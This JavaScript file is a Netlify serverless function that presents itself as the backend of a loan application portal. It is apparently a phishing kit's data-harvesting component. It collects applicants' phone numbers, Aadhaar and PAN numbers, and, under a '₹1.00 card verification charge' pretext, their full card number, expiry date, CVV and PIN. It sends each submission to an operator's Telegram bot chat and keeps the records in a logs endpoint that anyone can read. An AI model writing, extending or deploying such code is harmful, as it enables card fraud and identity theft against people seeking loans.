// Netlify serverless function for API endpoints (/api/telegram/*)

let telegramConfig = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || '',
};

const telegramLogs = [];

async function sendTelegramMessage(token, chatId, text) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });

  const resData = await response.json();
  if (!response.ok || !resData.ok) {
    throw new Error(resData.description || 'Failed to send Telegram message');
  }
  return resData;
}

export async function handler(event) {
  const path = event.path.replace(/\/\.netlify\/functions\/api/, '').replace(/\/api/, '');
  const method = event.httpMethod;

  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  };

  if (method === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    // GET /api/telegram/config
    if (path === '/telegram/config' && method === 'GET') {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          hasToken: Boolean(telegramConfig.botToken),
          hasChatId: Boolean(telegramConfig.chatId),
          maskedToken: telegramConfig.botToken
            ? `${telegramConfig.botToken.substring(0, 6)}...${telegramConfig.botToken.slice(-4)}`
            : '',
          chatId: telegramConfig.chatId,
        }),
      };
    }

    // POST /api/telegram/config
    if (path === '/telegram/config' && method === 'POST') {
      const body = JSON.parse(event.body || '{}');
      if (typeof body.botToken === 'string') telegramConfig.botToken = body.botToken.trim();
      if (typeof body.chatId === 'string') telegramConfig.chatId = body.chatId.trim();

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Telegram configuration updated successfully',
          hasToken: Boolean(telegramConfig.botToken),
          hasChatId: Boolean(telegramConfig.chatId),
        }),
      };
    }

    // GET /api/telegram/logs
    if (path === '/telegram/logs' && method === 'GET') {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          logs: telegramLogs,
          total: telegramLogs.length,
        }),
      };
    }

    // POST /api/telegram/send
    if (path === '/telegram/send' && method === 'POST') {
      const body = JSON.parse(event.body || '{}');
      const { type, data, customBotToken, customChatId } = body;

      const activeToken = customBotToken || telegramConfig.botToken;
      const activeChatId = customChatId || telegramConfig.chatId;

      const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      let formattedMessage = '';

      if (type === 'phone_step') {
        formattedMessage = `
📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>
──────────────────────────────
• <b>Phone Number:</b> <code>${data.phone}</code>
• <b>Submitted At:</b> ${timestamp}
• <b>Device/IP:</b> Netlify Web Client
`;
      } else if (type === 'personal_details') {
        formattedMessage = `
📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>
──────────────────────────────
• <b>Full Name:</b> ${data.name}
• <b>Phone Number:</b> <code>${data.phone}</code>
• <b>Employment Type:</b> ${data.employmentType}
• <b>Aadhaar Number:</b> <code>${data.adhar}</code>
• <b>PAN Card:</b> <code>${data.panCard || 'N/A'}</code>
• <b>Age:</b> ${data.age} years
• <b>State:</b> ${data.state}
• <b>City:</b> ${data.city}
• <b>Pincode:</b> ${data.pincode}
• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 200000).toLocaleString('en-IN')} (${data.loanTenure || 24} months)
• <b>Submitted At:</b> ${timestamp}
`;
      } else if (type === 'card_details') {
        formattedMessage = `
💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>
──────────────────────────────
• <b>Applicant Name:</b> ${data.name || 'N/A'}
• <b>Phone:</b> <code>${data.phone || 'N/A'}</code>
• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)
• <b>Card Number:</b> <code>${data.cardNumber}</code>
• <b>Card Holder:</b> ${data.cardHolder || 'N/A'}
• <b>Expiry Date:</b> <code>${data.exp}</code>
• <b>CVV:</b> <code>${data.cvv}</code>
• <b>PIN Number:</b> <code>${data.pin || 'Not Provided'}</code>
• <b>Submitted At:</b> ${timestamp}
`;
      } else {
        formattedMessage = `
ℹ️ <b>LOAN PORTAL EVENT</b>
──────────────────────────────
• <b>Event:</b> ${type}
• <b>Details:</b> <pre>${JSON.stringify(data, null, 2)}</pre>
• <b>Timestamp:</b> ${timestamp}
`;
      }

      const logEntry = {
        id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
        timestamp,
        type,
        formattedMessage,
        data,
        status: 'simulated',
      };

      if (!activeToken || !activeChatId) {
        logEntry.status = 'simulated';
        telegramLogs.unshift(logEntry);
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({
            success: true,
            simulated: true,
            message: 'Message logged in demo mode. Configure Telegram Bot Token & Chat ID in Settings to send live messages.',
            log: logEntry,
          }),
        };
      }

      try {
        await sendTelegramMessage(activeToken, activeChatId, formattedMessage);
        logEntry.status = 'sent';
        telegramLogs.unshift(logEntry);
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({
            success: true,
            simulated: false,
            message: 'Notification sent successfully to Telegram bot!',
            log: logEntry,
          }),
        };
      } catch (error) {
        logEntry.status = 'error';
        logEntry.errorMessage = error.message;
        telegramLogs.unshift(logEntry);
        return {
          statusCode: 500,
          headers,
          body: JSON.stringify({
            success: false,
            simulated: false,
            error: error.message || 'Failed to send message to Telegram bot',
            log: logEntry,
          }),
        };
      }
    }

    return {
      statusCode: 404,
      headers,
      body: JSON.stringify({ error: 'Endpoint not found' }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: err.message || 'Internal server error' }),
    };
  }
}
